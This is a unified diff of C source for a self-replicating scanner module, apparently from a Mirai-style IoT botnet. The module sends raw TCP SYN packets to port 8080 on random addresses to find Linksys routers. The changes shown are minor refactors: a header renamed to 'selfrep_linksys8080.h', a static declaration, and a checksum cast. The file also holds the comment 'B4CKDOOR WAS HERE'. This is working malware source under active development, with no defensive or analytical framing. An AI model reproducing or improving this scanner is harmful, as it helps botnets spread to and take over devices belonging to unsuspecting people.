@@ -15,12 +15,10 @@
 #include <signal.h>
 #include <errno.h>
 #include <string.h>
-#include <linux/ip.h>
-#include <linux/tcp.h>
 
 
 #include "includes.h"
-#include "linksys_scanner.h"
+#include "selfrep_linksys8080.h"
 #include "rand.h"
 #include "util.h"
 #include "checksum.h"
@@ -28,7 +26,7 @@
 
 int linksysscanner_scanner_pid = 0, linksysscanner_rsck = 0, linksysscanner_rsck_out = 0;
 char linksysscanner_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
-struct linksysscanner_scanner_connection *conn_table;
+static struct linksysscanner_scanner_connection *conn_table;
 uint32_t linksysscanner_fake_time = 0;
 // B4CKDOOR WAS HERE
 int linksysscanner_recv_strip_null(int sock, void *buf, int len, int flags)
@@ -63,7 +61,6 @@ void linksysscanner_scanner_init(void)
     if(linksysscanner_scanner_pid > 0 || linksysscanner_scanner_pid == -1)
         return;
 
-    LOCAL_ADDR = util_local_addr();
 
     rand_init();
     linksysscanner_fake_time = time(NULL);
@@ -149,7 +146,7 @@ void linksysscanner_scanner_init(void)
                 tcph->dest = htons(8080);
                 tcph->seq = iph->daddr;
                 tcph->check = 0;
-                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
+                tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
 
                 paddr.sin_family = AF_INET;
                 paddr.sin_addr.s_addr = iph->daddr;
